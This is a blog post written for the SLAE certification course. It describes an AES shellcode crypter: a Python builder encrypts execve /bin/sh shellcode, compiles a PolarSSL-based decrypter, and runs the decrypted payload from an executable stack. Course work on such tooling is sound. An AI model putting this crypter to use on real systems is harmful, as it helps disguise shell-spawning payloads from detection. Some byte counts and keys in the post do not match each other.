---
title:  "[SLAE 7] AES Shellcode crypter"
categories: [SLAE]
---

![Logo](/assets/images/tux-root.png)

This is the last assignment of SLAE: **_building a shellcode crypter_**. Thanks Vivek and the team at SecurityTube for the course!

* I  chose to do the encryption using _`python-crypto`_ library. I used _AES-128_, in _CBC mode_ with _PKCS5 padding_
* I did the decryption of the shellcode using the easily integrable [PolarSSL AES](https://tls.mbed.org/) source code

The encryption password is provided on the command line, then a Python script hard-codes it in the decrypter and builds it. For exemplify I've used the _`execve-stack`_ shellcode: 
```bash
$ ./encrypt_payload_polar.py 
Usage:
    ./encrypt_payload_polar.py [passphrase]
     
$ ./encrypt_payload_polar.py s3cr37
[+] Shellcode (len 32):
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
[+] Key:
"\xe8\xca\xa8\xd3\x69\x22\xbe\x22\xf3\x2e\x08\x30\x11\xc0\xef\xbc"
[+] IV:
"\x07\xb0\x24\x02\x5b\x00\x68\xfc\x34\x30\x5e\x42\x64\x24\x39\x99"
[+] Encrypted shellcode (len 134): 
"\x0d\x18\x30\xe5\xca\x14\x13\x3d\x5e\xb2\xfa\xeb\x60\x1d\x51\x9b"
"\x24\x74\x64\xd7\x17\x9f\x32\xdf\xbf\x36\xf4\x91\x9c\x03\x09\xfb"
[+] Compiling:
 -> gcc -Wall -z execstack -o encrypted_shellcode temp.c PolarSSL/aes.c PolarSSL/md5.c
 -> strip --strip-all encrypted_shellcode
 -> rm temp.c
[*] Done.
$ ./encrypted_shellcode
#
```

The encrypter/decrypter uses the password to generate a 128 bits key, by hashing the password.
The PolarSSL is extremely easy to integrate and use, compared with the OpenSSL, and the generated binary is also much smaller as only AES and MD5 functions are linked in. Here's a snippet of the decrypter code that does the main bits: 
```c
    [..]
    unsigned char key[16];
    unsigned char iv[16] = 
"\xb4\x9d\x64\x10\xa8\x3b\x1b\xa9\x29\xc4\x4b\x09\xfe\x2c\xd3\x56";
 
    unsigned char input[] = 
"\x24\x06\xa6\xe4\x5d\xc4\xc0\x0e\x36\x7d\x05\x5a\xfe\xc1\x07\x0c"
"\x31\x48\xef\x06\x0f\x09\x84\x98\x03\x3e\x04\x1e\x08\x6d\xb2\xe3";
    size_t input_len = 32;
    unsigned char output[32];
 
    unsigned char passw[] = "s3cr37";
    size_t in_len = 6;
 
    /* Generate a 128 bits key from the password */
    md5_context md5_ctx;
    md5_starts(&md5_ctx);
    md5_update(&md5_ctx, passw, in_len);
    md5_finish(&md5_ctx, key);
 
    /* Decrypt the payload */
    aes_context aes;
    aes_setkey_dec(&aes, key, 128);
    aes_crypt_cbc(&aes, AES_DECRYPT, input_len, iv, input, output);
 
    /* Execute decrypted shellcode */
    ((void (*)()) output)();
```

The Python script uses a template of the decrypter and fills in the encrypted shellcode, the lengths, IV and key and then generates the encrypted binary. Below is a snippet of the main function:
```python
def make_binary(password):
    sc_len = len(pad(shellcode))
    print_done("[+] Shellcode (len %d):" % (sc_len))
    print "%s" % (to_hex(shellcode))
 
    # Generate a secret key and random IV
    h = MD5.new()
 
    h.update(password)
    key = h.digest()
    str_key = to_hex(key)
    print_done("[+] Key:")
    print "%s" % str_key
 
    # Generate random IV
    iv = os.urandom(BS)
    str_iv = to_hex(iv) #"\"%s\"" % "".join(["\\x%02x" % ord(c) for c in iv])
    print_done("[+] IV:")
    print "%s" % str_iv
 
    # Create a cipher object using the random secret
    cipher = AES.new(key, AES.MODE_CBC, iv)
 
    enc = cipher.encrypt(pad(shellcode))
    str_enc = to_hex(enc)
    print_done("[+] Encrypted shellcode (len %d):" % (len(str_enc)))
    print "%s" % (str_enc)
 
    outline = open(decrypt_shell).read()
    code = outline % (str_iv, str_enc, sc_len, sc_len, password, len(password))
 
    # Write to temporary source file
    o = open(temp_src, "w")
    o.write(code)
    o.close()
 
    # Compile
    compile_cmd = "gcc -Wall -z execstack -o %s %s PolarSSL/aes.c PolarSSL/md5.c" % \
       (out_file, temp_src)
    print_done("[+] Compiling:") 
    print " -> %s" % compile_cmd
    os.system(compile_cmd)
 
 
    # Strip all symbols
    strip_cmd = "strip --strip-all %s" % (out_file)
    print " -> %s" % (strip_cmd)
    os.system(strip_cmd)
 
    # Delete intermediate files
    clean_cmd = "rm %s" % (temp_src)
    print " -> %s" % (clean_cmd)
    os.system(clean_cmd)
 
    print_ok("\n[*] Done. Run ./%s" % (out_file))
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
